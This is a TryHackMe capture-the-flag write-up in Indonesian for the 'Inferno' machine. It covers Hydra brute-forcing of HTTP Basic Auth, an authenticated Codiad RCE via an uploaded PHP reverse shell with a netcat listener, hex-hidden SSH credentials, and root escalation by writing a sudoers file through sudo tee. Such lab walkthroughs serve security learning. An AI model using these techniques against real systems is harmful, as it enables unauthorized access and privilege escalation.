# Inferno — TryHackMe Writeup

**Target:** Inferno  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Kategori:** Web Exploitation, HTTP Basic Authentication, Codiad RCE, Reverse Shell,Tee Privilege Escalation

---

## Recon

Saya memulai proses dengan melakukan scanning untuk mencari port yang terbuka sekaligus melakukan enumerasi service menggunakan RustScan.

```bash
rustscan -b 500 -a TARGET_IP
```

Hasil RustScan menunjukkan cukup banyak port yang terbuka. Saya kemudian memilih beberapa port yang menarik untuk dilakukan enumerasi lebih lanjut menggunakan Nmap.

```bash
nmap -sC -sV -T4 -p80,443,8081,8088 TARGET_IP
```

![nmap](images/nmap.png)

Web service berjalan pada port 80. Sebelum melakukan pengecekan secara manual, saya menjalankan FFUF di background untuk melakukan directory fuzzing.

```bash
ffuf -w ~/wordlists/dirbuster/directory-list-2.3-small.txt -u http://TARGET_IP/FUZZ
```

Homepage hanya menampilkan sebuah gambar lukisan dan tulisan yang terlihat seperti sebuah quote.

![homepage](images/homepage.png)

Saya sudah mencoba mengecek source code halaman tersebut, tetapi tidak menemukan sesuatu yang menarik.

Namun, FFUF menemukan endpoint berikut:

```text
inferno                 [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 80ms]
```

Setelah saya cek, endpoint tersebut ternyata dilindungi oleh HTTP authentication.

![httpauth](images/httpauth.png)

---

## HTTP Basic Authentication

Di sini saya mencoba melakukan brute force terhadap HTTP authentication menggunakan Hydra.

Saya menggunakan username `admin` karena merupakan username yang sangat umum. Selain itu, tidak ada salahnya untuk mencoba username tersebut, terutama karena hasil reconnaissance sebelumnya tidak memberikan informasi mengenai username lain yang bisa digunakan.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-get /inferno
```

![hydra](images/hydra.png)

Hydra berhasil menemukan password yang valid.

Setelah berhasil melewati HTTP Basic Authentication, saya diarahkan ke login form Codiad.

Saya mencoba menggunakan credential yang sama pada login form tersebut dan ternyata berhasil masuk.

![login](images/login.png)

---

## Codiad Enumeration

Setelah berhasil login dan melihat-lihat dashboard Codiad, saya tidak menemukan sesuatu yang langsung terlihat menarik.

Saya kemudian mencoba mencari CVE yang berhubungan dengan versi Codiad yang digunakan menggunakan SearchSploit.

![search](images/search.png)

Dari hasil SearchSploit, saya menemukan exploit berikut:

```text
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)
# Author: P4p4_M4n3
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Type:  WebApp
```

Proof of Concept dari exploit tersebut menjelaskan langkah-langkah berikut:

```text
1- login on codiad

2- go to themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/" directory

3- right click and select upload file

4- click on "Drag file or Click Here To Upload" and select your reverse_shell file
```

Setelah file berhasil di-upload, file tersebut seharusnya berada di directory `INF`. Dengan melakukan right-click pada file dan memilih delete, full path dari file yang di-upload dapat diketahui.

Path yang diberikan oleh exploit tersebut adalah:

```text
/var/www/html/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php
```

Exploit tersebut kemudian menyarankan untuk melakukan trigger menggunakan `curl`:

```text
1 - nc -lnvp 1234
2 - curl http://target_ip/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php -u "admin:P@ssw0rd"
```

Saya memutuskan untuk menggunakan exploit tersebut, tetapi tidak menggunakan `curl` untuk melakukan trigger.

Saya menggunakan browser dan langsung mengakses exact path dari file yang sudah di-upload:

```text
http://TARGET_IP/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell2.php
```

![shell](images/shell.png)

---

## Getting a Shell

Setelah mendapatkan shell, saya menemukan bahwa session terus-menerus terputus. Saya juga mencoba beberapa method reverse shell lainnya, tetapi hasilnya tetap sama.

Saat melakukan enumerasi, saya menemukan sebuah script yang bertanggung jawab terhadap mekanisme tersebut:

```text
/var/www/html/machine_services1320.sh
```

Isinya kurang lebih seperti berikut:

```bash
pkill bash &
q nc -nvlp 21 &
# berlanjut dengan nc -nvlp command hingga sekitar port 60k
```

Berdasarkan hal tersebut, saya memutuskan untuk menggunakan reverse shell berbasis `sh` daripada `bash`.

Cara ini berhasil dan session saya tetap aman tanpa terus-menerus terbunuh oleh mekanisme tersebut.

---

## User Enumeration

Saat melakukan enumerasi lebih lanjut, saya menemukan file `.download.bat` di directory Downloads milik Dante:

```text
/home/dante/Downloads/.download.bat
```

File tersebut berisi hexadecimal data:

```text
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

Setelah hexadecimal tersebut di-decode, hasilnya menjadi:

```text
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ ’l mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

Di dalam hasil decode tersebut terdapat credential SSH untuk user Dante:

```text
Username: dante
Password: V1rg1l10h3lpm3
```

Saya kemudian berhasil login sebagai Dante melalui SSH.

```bash
ssh dante@TARGET_IP /bin/sh
```

![dante](images/dante.png)

---

## Privilege Escalation — Dante → Root

Setelah login sebagai Dante, saya langsung mengecek permission sudo yang dimiliki user tersebut.

```bash
sudo -l
```

Dante ternyata dapat menjalankan `/usr/bin/tee` sebagai root tanpa password.

Saya memanfaatkan `tee` untuk membuat sudoers entry yang memberikan Dante full sudo privileges:

```bash
printf 'dante ALL=(ALL:ALL) NOPASSWD: ALL\n' | sudo /usr/bin/tee /etc/sudoers.d/dante
```

Kemudian saya mengecek kembali permission sudo:

```bash
sudo -l
```

Hasilnya:

```text
(ALL : ALL) NOPASSWD: ALL
    (root) NOPASSWD: /usr/bin/tee
```

Sekarang Dante sudah memiliki full sudo privileges, sehingga saya cukup menjalankan:

```bash
sudo /bin/sh
```

![root](images/root.png)

---

## Flags

### Local

```text
77f6f3c544ec0811e2d1243e2e0d1835
```

### Proof

```text
f332678ed0d0767d7434b8516a7c6144
```

